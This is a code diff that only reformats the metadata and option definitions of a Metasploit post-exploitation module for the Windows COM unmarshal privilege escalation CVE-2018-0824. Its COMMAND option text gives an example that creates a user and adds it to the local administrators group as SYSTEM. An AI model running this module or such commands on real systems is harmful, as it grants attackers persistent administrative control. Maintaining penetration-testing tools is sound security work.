@@ -5,45 +5,48 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::File
-#  include Msf::Post::Windows::Priv
+  #  include Msf::Post::Windows::Priv
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Windows unmarshal post exploitation',
-      'Description' => %q{
-        This module exploits a local privilege escalation bug which exists
-        in microsoft COM for windows when it fails to properly handle serialized objects.},
-      'References'  =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows unmarshal post exploitation',
+        'Description' => %q{
+          This module exploits a local privilege escalation bug which exists
+          in microsoft COM for windows when it fails to properly handle serialized objects.
+        },
+        'References' => [
           ['CVE', '2018-0824'],
           ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824'],
           ['URL', 'https://github.com/x73x61x6ex6ax61x79/UnmarshalPwn'],
           ['EDB', '44906']
         ],
-      'Author'      =>
-        [
+        'Author' => [
           'Nicolas Joly', # Vulnerability discovery
           'Matthias Kaiser', # Exploit PoC
           'Sanjay Gondaliya', # Modified PoC
           'Pratik Shah <pratik@notsosecure.com>' # Metasploit module
         ],
-      'DisclosureDate' => '2018-08-05',
-      'Platform'       => ['win'],
-      'Arch'           => ARCH_X64,
-      'License'        => MSF_LICENSE,
-    ))
+        'DisclosureDate' => '2018-08-05',
+        'Platform' => ['win'],
+        'Arch' => ARCH_X64,
+        'License' => MSF_LICENSE,
+      )
+    )
 
     register_options(
       [
-      OptString.new('COMMAND',
-        [false, 'The command to execute as SYSTEM (Can only be a cmd.exe builtin or Windows binary, (net user /add %RAND% %RAND% & net localgroup administrators /add <user>).', nil]),
-      OptString.new('EXPLOIT_NAME',
-        [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
-      OptString.new('SCRIPT_NAME',
-        [false, 'The filename to use for the COM script file (%RAND% by default).', nil]),
-      OptString.new('PATH',
-        [false, 'Path to write binaries (%TEMP% by default).', nil]),
-      ])
+        OptString.new('COMMAND',
+                      [false, 'The command to execute as SYSTEM (Can only be a cmd.exe builtin or Windows binary, (net user /add %RAND% %RAND% & net localgroup administrators /add <user>).', nil]),
+        OptString.new('EXPLOIT_NAME',
+                      [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
+        OptString.new('SCRIPT_NAME',
+                      [false, 'The filename to use for the COM script file (%RAND% by default).', nil]),
+        OptString.new('PATH',
+                      [false, 'Path to write binaries (%TEMP% by default).', nil]),
+      ]
+    )
   end
 
   def setup
@@ -166,4 +169,3 @@ class MetasploitModule < Msf::Post
   attr_reader :exploit_path
   attr_reader :script_path
 end
-
